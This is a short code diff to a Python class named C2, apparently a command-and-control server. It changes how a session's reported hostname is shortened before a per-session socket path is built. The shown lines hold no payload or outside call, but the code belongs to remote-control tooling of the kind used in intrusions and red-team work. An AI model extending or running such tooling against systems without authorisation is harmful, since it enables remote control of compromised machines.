@@ -1036,10 +1036,10 @@ class C2():
                     if task['task'] == 'prompt': # First task is to display prompt to user
                         task = session.recv_task() # Second one is the result
 
-                    hostname = task['result'].strip()
+                    hostname = task['result'].strip().split(".")[0]
 
                     # Allow us to address the sockets by short hostnames for ease of use
-                    SOCKET_PATH = self.socket_path + str(hostname.split(".")[0])
+                    SOCKET_PATH = self.socket_path + str(hostname)
 
                     if os.path.exists(SOCKET_PATH):
                         os.remove(SOCKET_PATH)
